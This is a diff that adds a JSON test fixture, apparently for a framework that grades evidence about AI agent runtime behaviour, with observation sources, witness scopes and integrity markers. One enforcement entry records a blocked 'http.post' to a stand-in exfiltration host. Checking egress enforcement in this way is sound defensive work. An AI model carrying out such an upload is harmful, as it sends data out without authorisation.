@@ -1,0 +1,67 @@
+{
+  "case_id": "grade-floor-e4-anchored",
+  "claim": "operationally-conformant",
+  "declared_grade": "E4",
+  "enforcement": {
+    "denials": [
+      {
+        "action": "http.post https://exfil.example.invalid/upload",
+        "policy": "egress-allowlist/v3",
+        "recorded_by": "egress-gateway"
+      }
+    ],
+    "policy_enforced_at_boundary": true
+  },
+  "integrity_claims": {},
+  "integrity_markers": {
+    "chain_link": {
+      "prev_sha256": "b0a7a0206aa25db1e2426f70411927c583fbacbbc6384f550f7a9cbd9e06ec58"
+    },
+    "external_timestamp": {
+      "authority": "https://tsa.example.invalid",
+      "token_sha256": "a5815dc989f010ab7b50f9b9289173e7d1ee689f48c288dc77aad5825e339b20",
+      "witness_scope": "EXTERNAL"
+    },
+    "independent_verification": {
+      "result": "verified",
+      "verifier": "https://verifier.example.invalid",
+      "witness_scope": "EXTERNAL"
+    }
+  },
+  "observations": [
+    {
+      "engine": "agent-runtime-log",
+      "observation_directness": "reconstructed",
+      "observation_vantage": "artifact",
+      "relationship": "direct",
+      "source": "self_report",
+      "witness_scope": "SELF"
+    },
+    {
+      "engine": "orchestrator-trace",
+      "observation_directness": "reconstructed",
+      "observation_vantage": "artifact",
+      "relationship": "direct",
+      "source": "framework",
+      "witness_scope": "PEER"
+    },
+    {
+      "engine": "egress-gateway",
+      "observation_directness": "intercepted",
+      "observation_vantage": "substrate",
+      "relationship": "independent",
+      "source": "gateway",
+      "witness_scope": "EXTERNAL"
+    },
+    {
+      "engine": "syscall-supervisor",
+      "observation_directness": "intercepted",
+      "observation_vantage": "substrate",
+      "relationship": "independent",
+      "source": "gateway",
+      "witness_scope": "EXTERNAL"
+    }
+  ],
+  "reconciliation": "agreement",
+  "schema": "evidence-grade-record/v1"
+}
